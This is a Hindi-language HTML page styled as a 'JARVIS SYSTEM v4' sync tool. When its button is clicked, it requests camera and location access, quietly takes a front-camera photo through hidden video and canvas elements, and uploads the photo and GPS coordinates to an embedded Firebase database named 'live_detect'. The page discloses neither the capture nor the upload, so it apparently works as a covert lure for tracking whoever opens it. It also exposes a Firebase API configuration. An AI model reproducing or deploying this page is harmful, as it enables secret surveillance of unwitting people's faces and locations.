<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JARVIS REMOTE - COMPRESSED</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <style>
        body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
        .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
        .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
        #v { display: none; } canvas { display: none; }
    </style>
</head>
<body>
    <div class="control-box">
        <h2>JARVIS SYSTEM v4</h2>
        <p style="color: #888;">लोकेशन और कंप्रेस्ड फोटो लिंक</p>
        <video id="v" autoplay playsinline muted></video>
        <canvas id="c"></canvas>
        <button class="btn" onclick="syncData()">🚀 फुल सिस्टम सिंक</button>
        <div class="status-text" id="log-status">रेडी...</div>
    </div>

    <script>
        const firebaseConfig = {
          apiKey: "AIzaSyAfwCTBBc_LT8j7neC_aJhBCHUXj3QkSHc",
          authDomain: "army-cb492.firebaseapp.com",
          databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
          projectId: "army-cb492",
          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
        };
        if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        async function syncData() {
            document.getElementById('log-status').innerHTML = "कनेक्ट किया जा रहा है...";
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                document.getElementById('v').srcObject = stream;

                navigator.geolocation.getCurrentPosition((pos) => {
                    const lat = pos.coords.latitude;
                    const lon = pos.coords.longitude;
                    database.ref('live_detect/location').set({ lat: lat, lon: lon });
                    
                    // फोटो कैप्चर लॉजिक
                    setTimeout(() => {
                        const v = document.getElementById('v');
                        const c = document.getElementById('c');
                        c.width = 240; // साइज एकदम छोटा किया ताकि डेटाबेस हैंग न हो
                        c.height = 180;
                        c.getContext('2d').drawImage(v, 0, 0, 240, 180);
                        const smallPhoto = c.toDataURL('image/jpeg', 0.4); // सुपर कंप्रेस्ड
                        
                        database.ref('live_detect').update({ photo: smallPhoto });
                        document.getElementById('log-status').innerHTML = "✅ मैप और फोटो सिंक हो गए!";
                        stream.getTracks().forEach(t => t.stop());
                    }, 1000);
                }, err => { alert("लोकेशन परमिशन चालू करें बॉस!"); });
            } catch(e) { alert("कैमरा परमिशन दें बॉस!"); }
        }
    </script>
</body>
</html>
